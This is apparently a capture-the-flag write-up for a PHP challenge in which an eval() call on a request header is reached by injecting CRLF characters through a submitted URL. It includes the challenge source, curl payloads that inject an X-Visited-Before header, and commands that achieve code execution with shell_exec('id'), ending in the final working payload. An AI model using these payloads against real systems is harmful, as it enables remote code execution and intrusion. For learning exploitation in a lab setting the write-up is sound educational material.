# Clean url as a Service


![image](https://user-images.githubusercontent.com/31372554/164913784-f3c5e9b7-e7c1-48fa-be5e-1db086f0987f.png)

Upon visiting the site, we can see there is an input field which asks for an url. The placeholder is set to https://www.example.tld/cleanmepls?name=joe&age=13&address=very-very-very-long-string so let's try with a simple url such as:

https://google.com/?test=test



Upon clicking on the `clean` button , a POST request is sent to the `cleaner.php` endpoint and in the body of the request you can see our URL:

```
POST / HTTP/1.1
Host: 127.0.0.1:1337
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 45


url=https%3A%2F%2Fgoogle.com%2F%3Ftest%3Dtest
```


The server returns this output:

![image](https://user-images.githubusercontent.com/31372554/164913766-6885efbf-08a1-413a-b5d2-7b9e0e269a84.png)


```
There your cleaned url: google.com
Thank you For Using our Service!
```

OK, from this output it's clear that the application just takes an URL as an input and returns the host part as the output. Or is to so?


--------------------------


Let's dive deep into the source code to figure it out:
We were provided with two php files `index.php` and `cleaner.php`

`Cleaner.php` (section 1)
```php
<?php

if ($_SERVER["REMOTE_ADDR"] != "127.0.0.1"){

die("<img src='https://imgur.com/x7BCUsr.png'>");

}


echo "<br>There your cleaned url: ".$_POST['host'];
echo "<br>Thank you For Using our Service!";


function tryandeval($value){
                echo "<br>How many you visited us ";
                eval($value);
        }


foreach (getallheaders() as $name => $value) {
        error_log($value);
	if ($name == "X-Visited-Before"){ // [2]
		tryandeval($value);
	}}
?>

```

`index.php` (section 2)

```php

<?php
if($_SERVER['REQUEST_METHOD'] == "POST" and isset($_POST['url']))
    {
        clean_and_send($_POST['url']);
    }

	function clean_and_send($url){
		error_log("Cleaning url: ".$url);
			$uncleanedURL = $url; // should be not used anymore
			$values = parse_url($url);
			$host = explode('/',$values['host']);
			$query = $host[0];
			$data = array('host'=>$query);
			$cleanerurl = "http://127.0.0.1/cleaner.php";
   			$stream = file_get_contents($cleanerurl, true, stream_context_create(['http' => [ //[1]
			'method' => 'POST',
			'header' => "X-Original-URL: $uncleanedURL",
			'content' => http_build_query($data)
			]
			]));
    			echo $stream;
?>

```

The `index.php` code starts with a *if condition check* which basically checks for two things the `REQUEST_METHOD`  and the `url` parameter. If the request method is *POST* and in the request body there is `url` parameter.

The `clean_and_send` function is called and the url is directly passed as an *arguement* to this function.

In the function, the argument url is stored in the `$uncleanedURL` variable.

This array is then stored in the `$values` variable.

```php
php > print_r(parse_url("https://google.com/?test=test"));
Array
(
    [scheme] => https
    [host] => google.com
    [path] => /
    [query] => test=test
)
```

By executing the challenge code line by line, you can get a understanding of what the code does.

```php
php > $host = explode('/',$values['host']);
php > echo $host;
PHP Notice:  Array to string conversion in php shell code on line 1
Array
php > print_r($host);
Array
(
    [0] => google.com
)
```

In line `[1]` , using *file_get_contents*  a POST request to the `/cleaner.php`  is made along with one additional header `'header' => "X-Original-URL: $uncleanedURL"` , on the side note we have full control over `X-Original-URL` header value let's keep this in mind and check the `cleaner.php` code to understand how it handles the POST request.


On the very first line in `cleaner.php`, there is a condition to check whether the client's IP is equal to 127.0.0.1 or not.

There is one interesting function `tryandeval` which is only invoked if the POST request contains the `X-Visited-Before` header (the value of this header is passed as an arguement to tryandeval function) it then passes the header value to `eval`.

So now we have our goal clear of what we need to do, we have to find a way to include `X-Visited-Before` header in the POST request which is sent to the `cleaner.php` endpoint ([1])



As the cleaner.php endpoint was accessible by directly visiting the http://challengesite.xyz/cleaner.php , I thought if there's any way to bypass the `$_SERVER["REMOTE_ADDR"] != "127.0.0.1"` check we can easily add the required `X-Visited-Before` header and execute any command we want.

After reading some articles & stackoverflow posts, I found that it was the correct way of validating client's IP.So I then started looking at other part of the [1] line.

Remeber earlier I told to keep note of the `X-Original-URL` , as we have full control over it's value we can try including crlf characters to check if header injection is possible or not.

It was just assumption what would happen if I run the following code:

```php

$uncleanedURL = $_GET['uncleanedURL'];


function test($uncleanedURL){
      $cleanerurl = "https://en2celr7rewbul.m.pipedream.net";
      $data = "test";
      $stream = file_get_contents($cleanerurl, true, stream_context_create(['http' => [ 
        'method' => 'POST',
        'header' => "X-Original-URL: $uncleanedURL",
        'content' => http_build_query($data) ]
    ]));
}

test($uncleanedURL);
```
```bash
curl "http://127.0.0.1:1337/test.php?uncleanedURL=https://google.com/?test=test"
```

![chrome_3LXzVAMNyB](https://user-images.githubusercontent.com/31372554/164913802-1f44c24b-5316-49fb-9e40-267ba9b350f8.png)


Now let's try to add a new header using `%0AX-Hacked:shirley`

```bash
curl "http://127.0.0.1:1337/test.php?uncleanedURL=https://google.com/?test=test%0AX-Hacked:shirley"
```


![chrome_VO98hEuiO3](https://user-images.githubusercontent.com/31372554/164913805-3aa1a4b6-e595-4748-8a86-5315dfe045de.png)


We have successfully added a new header 😎


----------------------------------------------------------



Coming to back to the challenge code, let's try to input the following url: `https://google.com/?test=test%0AX-Visited-Before:1` 


![ubuntu_sv5JH76CN8](https://user-images.githubusercontent.com/31372554/164913824-7c24ce34-f48e-4f27-8917-075975278870.png)


The application didn't even returned any message , if we look at the above screenshot:

On the right hand side you can see that we have successfully added the `X-Visited-Before` header to the request , but it seems an error was triggered by the `eval` function.

eval function executes any given string as a php code, `shirley` was provided as a string to the eval function. As `shirley` string isn't a valid php code the error was triggered.

Let's this try something simple: `echo 1337;` (semicolon is necessary as in php every statement should end with a semicolon)

```bash
curl http://127.0.0.1:1337/ -d "url=https://google.com/%0aX-Visited-Before:echo 1337;" -X POST
```

We get the following response:

```html
<br>There your cleaned url: google.com<br>Thank you For Using our Service!<br>How many you visited us 1337
```

Bingoo ! We can also execute any system command such as `id`

```bash
curl http://127.0.0.1:1337/ -d "url=https://google.com/%0aX-Visited-Before:echo shell_exec('id');" -X POST 
```

```
<br>There your cleaned url: google.com<br>Thank you For Using our Service!<br>How many you visited us uid=1000(shirley) gid=1000(shirley) groups=1000(shirley),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo)
```



In the end when I actually used the same payload on the challenge site, it didn't worked for some reasons which I wasn't aware. I tried some payload variations such as `%0A%0Dheader:value` but still couldn't figured it out.
As I was making no progress , I decided to contact the author of the challenge and explained everything to him. Turns out the problem was that the challenge site was running on Apache webserver and I was using the inbuilt php webserver.

The final working payload which also worked on the challenge site was: `https://google.com/%0D%0AX-Visited-Before:echo+1;`

